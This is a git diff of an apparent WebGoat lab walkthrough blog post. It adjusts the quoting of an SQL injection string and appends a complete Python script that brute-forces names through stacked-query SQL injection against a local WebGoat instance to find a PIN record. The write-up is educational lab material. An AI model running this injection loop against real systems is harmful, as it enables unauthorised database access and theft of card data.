@@ -71,7 +71,7 @@ def main():
 	for index,name in enumerate(namelist):
 		capitalized_name = name[0].upper() + name[1:]
 		print ("[*] Attempt {} | Name: {}".format(index, capitalized_name))
-		attempt = "101;select * from pins where cc_number = 4321432143214321 and name = '{}'--".format(capitalized_name)
+		attempt = "101;select * from pins where cc_number = 4321432143214321 and name = {}--".format(capitalized_name)
 		payload= {"account_number":attempt,"SUBMIT":"Go%21"}
 		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=13&menu=1100", params=payload, headers=headers, cookies=cookies)
 		if r.status_code == 200:
@@ -97,6 +97,8 @@ Oh man...That's a bummer. Now it could be a few things causing this failure, one
 
 <img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_15/brute-string-success.jpg">
 
+<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_15/challenge-success.jpg">
+
 Awesome! Wordlists and Python strike again.
 
 ### References
@@ -104,3 +106,50 @@ Awesome! Wordlists and Python strike again.
 [1. Cracker's Namelist][crackers-namelist]
 
 [crackers-namelist]:http://www.outpost9.com/files/wordlists.html
+
+#### Final SQLi Bruteforce Script:
+
+{% highlight python %}
+import sys
+import requests
+
+wordlist_paths = [
+	"another-long-path/names.txt",
+]
+
+
+def main():
+	namelist = []
+	print "[+] Populating the namelist ..."
+	for wordlist_path in wordlist_paths:
+		print "	[*] Populating from list: {}".format(wordlist_path.split("/")[-1])
+		with open(wordlist_path, "r") as wordlist_file:
+			word_data = wordlist_file.read()
+			namelist += word_data.splitlines()
+	print "	[*] Checking that wordlist was populated"
+	if  len(namelist) == 0:
+		print "[-] Wordlist was not populated... Exiting"
+		sys.exit(1)
+	print "[+] Wordlist populated successfully"
+
+	headers = {
+		"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
+	}
+	cookies = dict(JSESSIONID="9807FE50B02B2B1D50B8113FFB60D0DC",acopendivids="swingset,jotto,phpbb2,redmine",acgroupswithpersist="nada")
+
+	for index,name in enumerate(namelist):
+		capitalized_name = name[0].upper() + name[1:]
+		print ("[*] Attempt {} | Name: {}".format(index, capitalized_name))
+		attempt = "101;select * from pins where cc_number = 4321432143214321 and name = '{}'--".format(capitalized_name)
+		payload= {"account_number":attempt,"SUBMIT":"Go%21"}
+		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=13&menu=1100", params=payload, headers=headers, cookies=cookies)
+		if r.status_code == 200:
+			if "account number is valid" in r.text.lower():
+				print ("[+] SUCCESS! Name is: {}".format(capitalized_name))
+				sys.exit(0)
+		else:
+			print ("error: {}".format(r.text))
+			sys.exit(1)
+
+main()
+{% endhighlight %}
